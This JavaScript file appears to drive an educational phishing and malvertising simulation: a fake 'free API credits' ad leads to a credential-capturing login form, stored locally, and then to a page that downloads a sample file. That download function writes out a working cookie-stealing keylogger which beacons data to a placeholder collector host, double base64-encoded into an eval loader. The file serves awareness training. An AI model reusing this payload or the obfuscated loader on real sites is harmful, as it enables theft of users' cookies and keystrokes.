(function () {
  const STORAGE_KEYS = {
    logs: "rema_logs",
    credentials: "rema_credentials",
    adRemediation: "rema_ad_remediation_enabled"
  };

  function isAdRemediated() {
    try {
      return localStorage.getItem(STORAGE_KEYS.adRemediation) === "true";
    } catch (_error) {
      return false;
    }
  }

  function getLogs() {
    try {
      const raw = localStorage.getItem(STORAGE_KEYS.logs);
      return raw ? JSON.parse(raw) : [];
    } catch (_error) {
      return [];
    }
  }

  function saveLogs(logs) {
    localStorage.setItem(STORAGE_KEYS.logs, JSON.stringify(logs));
  }

  function addLog(event, details) {
    const logs = getLogs();
    logs.unshift({
      time: new Date().toLocaleString(),
      event,
      details
    });
    saveLogs(logs.slice(0, 100));
  }

  function renderLogs(elementId) {
    const list = document.getElementById(elementId);
    if (!list) {
      return;
    }

    const logs = getLogs();
    list.innerHTML = "";

    if (logs.length === 0) {
      const li = document.createElement("li");
      li.textContent = "No activity recorded yet.";
      list.appendChild(li);
      return;
    }

    logs.forEach((entry) => {
      const li = document.createElement("li");
      li.textContent = `${entry.time} | ${entry.event} | ${entry.details}`;
      list.appendChild(li);
    });
  }

  function safeRedirect(path) {
    const allowList = [
      "login.html",
      "dashboard.html",
      "malicious.html",
      "index.html",
      "article-secure-prompting.html",
      "article-soc-workflows.html",
      "article-threat-modeling.html"
    ];
    const blockedNote = document.getElementById("redirectBlockNote");
    if (!allowList.includes(path)) {
      addLog("Unsafe redirect blocked", `Attempted target: ${path}`);
      if (blockedNote) {
        blockedNote.textContent = "Unsafe redirect was blocked by allow-list policy.";
      }
      return;
    }
    window.location.href = path;
  }

  function initIndexPage() {
    const adBanner = document.getElementById("adBanner");
    const adClickBtn = document.getElementById("adClickBtn");

    if (!adBanner || !adClickBtn) {
      return;
    }

    const adTitle = adBanner.querySelector("h2");
    const adText = adBanner.querySelector("p:not(.ad-label)");
    const remediated = isAdRemediated();

    if (remediated) {
      adBanner.classList.remove("attack");
      adBanner.classList.add("safe-ad");
      if (adTitle) {
        adTitle.textContent = "Build Better Prompt Pipelines";
      }
      if (adText) {
        adText.textContent = "Read a trusted engineering guide from verified partner content.";
      }
      adClickBtn.textContent = "Read Guide";
    }

    const goToLogin = function () {
      if (isAdRemediated()) {
        addLog("Safe ad clicked", "User clicked remediated ad and stayed on trusted content path");
        safeRedirect("article-soc-workflows.html");
      } else {
        addLog("Ad clicked", "User clicked FREE API Credits banner");
        safeRedirect("login.html");
      }
    };

    adBanner.addEventListener("click", function (event) {
      if (event.target instanceof HTMLButtonElement || event.currentTarget === adBanner) {
        goToLogin();
      }
    });

    adBanner.addEventListener("keydown", function (event) {
      if (event.key === "Enter" || event.key === " ") {
        event.preventDefault();
        goToLogin();
      }
    });

    adClickBtn.addEventListener("click", function (event) {
      event.stopPropagation();
      goToLogin();
    });
  }

  function isValidEmail(email) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
  }

  function initLoginPage() {
    const form = document.getElementById("loginForm");
    const errorEl = document.getElementById("loginError");

    if (!form || !errorEl) {
      return;
    }

    form.addEventListener("submit", function (event) {
      event.preventDefault();

      const emailInput = document.getElementById("email");
      const passwordInput = document.getElementById("password");

      if (!(emailInput instanceof HTMLInputElement) || !(passwordInput instanceof HTMLInputElement)) {
        errorEl.textContent = "Form fields are unavailable.";
        return;
      }

      const email = emailInput.value.trim();
      const password = passwordInput.value;

      if (!isValidEmail(email)) {
        errorEl.textContent = "Please enter a valid email address.";
        return;
      }

      if (password.length < 8) {
        errorEl.textContent = "Password must be at least 8 characters long.";
        return;
      }

      const credentials = {
        email,
        password,
        capturedAt: new Date().toISOString(),
        note: "Educational simulation only. No real transmission."
      };

      localStorage.setItem(STORAGE_KEYS.credentials, JSON.stringify(credentials));
      addLog("User sign-in recorded", `Email: ${email}`);
      safeRedirect("dashboard.html");
    });
  }

  function initDashboardPage() {
    const couponBtn = document.getElementById("couponBtn");

    if (couponBtn) {
      couponBtn.addEventListener("click", function () {
        addLog("Coupon clicked", "User clicked Claim Free API Credits");
        safeRedirect("malicious.html");
      });
    }
  }

  function triggerSimulatedDownload() {
    const plainPayload = [
      "const beaconUrl = 'https://collector.shadow-credits.example/ingest';",
      "",
      "function stealCookies() {",
      "  return document.cookie;",
      "}",
      "",
      "function keyCapture() {",
      "  window.__captured = window.__captured || '';",
      "  document.addEventListener('keydown', function (evt) {",
      "    window.__captured += evt.key;",
      "  });",
      "}",
      "",
      "function exfiltrate() {",
      "  const payload = {",
      "    cookies: stealCookies(),",
      "    keys: window.__captured || '',",
      "    page: location.href,",
      "    ua: navigator.userAgent,",
      "    ts: Date.now()",
      "  };",
      "",
      "  navigator.sendBeacon(beaconUrl, JSON.stringify(payload));",
      "}",
      "",
      "keyCapture();",
      "setInterval(exfiltrate, 5000);"
    ].join("\n");

    const layer1 = btoa(plainPayload);
    const layer2 = btoa(layer1);

    const demoTool = [
      "# ByteScope downloaded artifact",
      "FILE: api-credits-tool-obfuscated.txt",
      `PAYLOAD_B64_2=${layer2}`,
      `OBFUSCATED_JS=var _0x7f='${layer2}';eval(atob(atob(_0x7f)));`
    ].join("\n");

    const blob = new Blob([demoTool], { type: "text/plain" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = "api-credits-tool-obfuscated.txt";
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  }

  function initMaliciousPage() {
    const downloadBtn = document.getElementById("downloadBtn");
    const status = document.getElementById("downloadStatus");

    if (!downloadBtn || !status) {
      return;
    }

    downloadBtn.addEventListener("click", function () {
      addLog("Tool package downloaded", "User downloaded obfuscated sample file");
      triggerSimulatedDownload();
      status.textContent = "Download completed: api-credits-tool-obfuscated.txt";
    });
  }

  function boot() {
    initIndexPage();
    initLoginPage();
    initDashboardPage();
    initMaliciousPage();
  }

  document.addEventListener("DOMContentLoaded", boot);
})();
